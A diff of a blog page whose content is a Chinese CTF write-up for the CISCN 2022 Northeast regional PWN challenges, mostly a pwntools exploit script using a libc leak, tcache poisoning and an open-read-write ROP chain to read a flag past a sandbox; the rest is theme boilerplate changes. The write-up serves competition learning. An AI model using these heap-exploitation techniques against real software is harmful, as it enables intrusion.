@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/hai.png">
-  <link rel="icon" href="/img/icon/hai.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/duck.png">
+  <link rel="icon" href="/img/icon/duck.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -68,7 +68,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"loora1n.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"lftEbNU4XPuR5dgHNV3WdWxP-gzGzoHsz","app_key":"b3uLUVGLeOWDwREWHMBr0jo9","server_url":"https://lftebnu4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"loora1n.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"lftEbNU4XPuR5dgHNV3WdWxP-gzGzoHsz","app_key":"b3uLUVGLeOWDwREWHMBr0jo9","server_url":"https://lftebnu4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -77,6 +77,25 @@
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
 
   
 <meta name="generator" content="Hexo 6.2.0"></head>
@@ -263,17 +282,19 @@
             <!-- SEO header -->
             <h1 style="display: none">【CISCN2022】东北赛区分区赛PWN WriteUP</h1>
             
-            <div class="markdown-body">
-              
-              <h2 id="soil3-amp-mountain1"><a href="#soil3-amp-mountain1" class="headerlink" title="soil3 &amp; mountain1"></a>soil3 &amp; mountain1</h2><ul>
+            
+              <div class="markdown-body">
+                
+                <h2 id="soil3-amp-mountain1"><a href="#soil3-amp-mountain1" class="headerlink" title="soil3 &amp; mountain1"></a>soil3 &amp; mountain1</h2><ul>
 <li>首先根据unsorted bin 泄露出libc</li>
 <li>然后根据libc_base 和 <code>libc.bss()</code>函数泄露栈地址</li>
 <li>利用orw ROP覆盖ret返回地址，并绕过沙盒机制</li>
 <li>soil3 题目，唯一的区别就是没有沙盒，原mountain题目的EXP即可通过</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;172.16.30.186&#x27;,58012)</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input size:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>    io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <span class="hljs-keyword">if</span> idx&lt;=<span class="hljs-number">32</span>:<br>        io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>        io.send(content)<br><br><br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># io.recvline()</span><br><span class="hljs-comment"># pause()</span><br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="hljs-string">&#x27;main_arena&#x27;</span>] - <span class="hljs-number">96</span><br>success(<span class="hljs-string">&#x27;libc_base --&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>bss_addr = libc_base + libc.bss()<br>success(<span class="hljs-string">&#x27;bss --&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(bss_addr))<br>flag_addr = bss_addr + <span class="hljs-number">0x200</span><br><span class="hljs-comment"># edit(32,&#x27;&#x27;)</span><br><br>pop_rdi = libc_base +<span class="hljs-number">0x000000000002daa2</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x0000000000037bfa</span><span class="hljs-comment"># : pop rsi ; ret</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000106791</span><span class="hljs-comment"># : pop rdx ; pop r12 ; ret</span><br>pop_rax = libc_base + <span class="hljs-number">0x00000000000446b0</span><span class="hljs-comment"># : pop rax ; ret</span><br>open_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><br><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>key = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(key))<br><span class="hljs-comment"># pause()</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x40</span>)<br><span class="hljs-comment"># pause()</span><br>free(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">0</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br><br>add(<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>stack = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>ret = stack-<span class="hljs-number">0x148</span><br>success(<span class="hljs-string">&#x27;stack_addr --&gt;&#x27;</span> +<span class="hljs-built_in">hex</span>(stack-<span class="hljs-number">0x8</span>))<br>success(<span class="hljs-string">&#x27;ret--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(ret))<br><span class="hljs-comment"># free(1)</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,p64((ret)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((ret)^key))<br>pause()<br>orw = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>orw += p64(pop_rdi)<br>orw += p64(ret)<br>orw += p64(pop_rsi)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(open_addr)<br><br><br><span class="hljs-comment">##read</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(read_addr)<br><br><span class="hljs-comment">##write</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">1</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(write_addr)<br>add(<span class="hljs-number">0x400</span>,orw)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
-              
-            </div>
+                
+              </div>
+            
             <hr/>
             <div>
               <div class="post-metas my-3">
@@ -304,21 +325,23 @@
         </div>
       
       
-      <div class="license-meta-item">
-        <div>许可协议</div>
-        <div>
-          
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
             
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
             
-              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-              <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                <i class="iconfont icon-by"></i>
-              </span>
-              </a>
-            
-          
+          </div>
         </div>
-      </div>
+      
     </div>
     <div class="license-icon iconfont"></div>
   </div>
@@ -427,6 +450,7 @@
 
 
   
+
 
 
 
@@ -545,25 +569,6 @@
 
 
 
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-    
-  
-
-
-
-
 
 
 
@@ -575,94 +580,41 @@
     var boardCtn = jQuery('#board-ctn');
     var boardTop = boardCtn.offset().top;
 
-    window.tocbot.init({
+    window.tocbot.init(Object.assign({
       tocSelector     : '#toc-body',
       contentSelector : '.markdown-body',
-      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
       linkClass       : 'tocbot-link',
       activeLinkClass : 'tocbot-active-link',
       listClass       : 'tocbot-list',
       isCollapsedClass: 'tocbot-is-collapsed',
       collapsibleClass: 'tocbot-is-collapsible',
-      collapseDepth   : CONFIG.toc.collapseDepth || 0,
       scrollSmooth    : true,
-      headingsOffset  : -boardTop
-    });
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
     if (toc.find('.toc-list-item').length > 0) {
       toc.css('visibility', 'visible');
     }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
   });
 </script>
 
 
-  <script>
-  (function() {
-    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
-    var enableCopy = CONFIG.copy_btn;
-    if (!enableLang && !enableCopy) {
-      return;
-    }
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
 
-    function getBgClass(ele) {
-      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
-    }
-
-    var copyTmpl = '';
-    copyTmpl += '<div class="code-widget">';
-    copyTmpl += 'LANG';
-    copyTmpl += '</div>';
-    jQuery('.markdown-body pre').each(function() {
-      var $pre = jQuery(this);
-      if ($pre.find('code.mermaid').length > 0) {
-        return;
-      }
-      if ($pre.find('span.line').length > 0) {
-        return;
-      }
-
-      var lang = '';
-
-      if (enableLang) {
-        lang = CONFIG.code_language.default;
-        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
-          lang = $pre[0].children[0].classList[1];
-        } else if ($pre[0].getAttribute('data-language')) {
-          lang = $pre[0].getAttribute('data-language');
-        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
-          lang = $pre[0].children[0].classList[1];
-          $pre.parent().addClass('code-wrapper');
-        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
-          $pre.wrap('<div class="code-wrapper"></div>');
-        }
-        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
-      }
-      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
-        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
-
-      if (enableCopy) {
-        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
-          var clipboard = new window.ClipboardJS('.copy-btn', {
-            target: function(trigger) {
-              var nodes = trigger.parentNode.childNodes;
-              for (var i = 0; i < nodes.length; i++) {
-                if (nodes[i].tagName === 'CODE') {
-                  return nodes[i];
-                }
-              }
-            }
-          });
-          clipboard.on('success', function(e) {
-            e.clearSelection();
-            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
-            setTimeout(function() {
-              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
-            }, 2000);
-          });
-        });
-      }
-    });
-  })();
-</script>
+  <script>Fluid.plugins.codeWidget();</script>
 
 
   
@@ -684,6 +636,21 @@
       window.anchors.options.class = 'anchorjs-link-left';
     }
     window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
   });
 </script>
 
@@ -698,9 +665,9 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/js/local-search.js" ></script>
-
   <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
